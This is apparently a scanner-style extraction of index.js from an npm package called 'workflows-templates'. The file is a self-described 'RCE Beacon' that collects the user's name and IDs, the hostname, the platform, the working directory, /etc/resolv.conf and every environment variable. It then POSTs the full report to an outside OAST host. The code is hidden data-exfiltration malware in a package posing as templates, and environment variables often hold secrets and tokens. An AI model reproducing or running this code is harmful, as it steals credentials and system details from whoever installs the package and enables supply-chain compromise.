// File: tmp/tmpfxo0vepf/workflows-templates/package/index.js
// ======================================================================
Line 4: const os = require('os')
Line 5: const fs = require('fs')
Line 6: const http = require('http')
Line 13: {
    let report = `[+] === Nepalese Hunter: RCE Beacon (Node.js) ===\n`;
    report += `[>] Payload ID: ${payloadIdentifier}\n`;
    report += `[>] Timestamp: ${new Date().toUTCString()}\n`;

    // System and User Info
    try {
        const userInfo = os.userInfo();
        report += `\n[+] --- SYSTEM & USER CONTEXT ---\n`;
        report += `User: ${userInfo.username} (uid:${userInfo.uid}, gid:${userInfo.gid})\n`;
        report += `Hostname: ${os.hostname()}\n`;
        report += `Platform: ${os.platform()} ${os.release()} ${os.arch()}\n`;
        report += `PWD: ${process.cwd()}\n`;
    } catch (e) { }

    // DNS Resolver
    try {
        const resolvConf = fs.readFileSync('/etc/resolv.conf', 'utf8');
        report += `\n[+] --- DNS CONFIGURATION (/etc/resolv.conf) ---\n${resolvConf}\n`;
    } catch (e) { }

    // Environment Variables
    try {
        report += `\n[+] --- FULL ENVIRONMENT VARIABLES ---\n${JSON.stringify(process.env, null, 2)}\n`;
    } catch (e) { }

  ...
Line 14: let report = `[+] === Nepalese Hunter: RCE Beacon (Node.js) ===\n`
Line 15: report += `[>] Payload ID: ${payloadIdentifier}\n`
Line 16: report += `[>] Timestamp: ${new Date().toUTCString()}\n`
Line 19: {
        const userInfo = os.userInfo();
        report += `\n[+] --- SYSTEM & USER CONTEXT ---\n`;
        report += `User: ${userInfo.username} (uid:${userInfo.uid}, gid:${userInfo.gid})\n`;
        report += `Hostname: ${os.hostname()}\n`;
        report += `Platform: ${os.platform()} ${os.release()} ${os.arch()}\n`;
        report += `PWD: ${process.cwd()}\n`;
    }
Line 20: os.userInfo()
Line 21: report += `\n[+] --- SYSTEM & USER CONTEXT ---\n`
Line 23: os.hostname()
Line 24: os.platform()
Line 29: {
        const resolvConf = fs.readFileSync('/etc/resolv.conf', 'utf8');
        report += `\n[+] --- DNS CONFIGURATION (/etc/resolv.conf) ---\n${resolvConf}\n`;
    }
Line 30: const resolvConf = fs.readFileSync('/etc/resolv.conf', 'utf8')
Line 31: report += `\n[+] --- DNS CONFIGURATION (/etc/resolv.conf) ---\n${resolvConf}\n`
Line 35: {
        report += `\n[+] --- FULL ENVIRONMENT VARIABLES ---\n${JSON.stringify(process.env, null, 2)}\n`;
    }
Line 36: report += `\n[+] --- FULL ENVIRONMENT VARIABLES ---\n${JSON.stringify(process.env, null, 2)}\n`
Line 42: {
    const options = {
        hostname: oastHost,
        port: 80,
        path: `/NODE-RCE-FROM-${os.hostname()}`,
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain',
            'Content-Length': Buffer.byteLength(data),
        },
    };

    const req = http.request(options, (res) => {
        res.resume();
    });

    req.on('error', () => {
        process.exit(1); // Force fallback if exfil fails
    });

    req.write(data);
    req.end();
}
Line 46: os.hostname()
Line 54: const req = http.request(options, (res) => {
        res.resume();
    })
Line 59: process.exit(1)
Line 62: req.write(data)
Line 63: req.end()
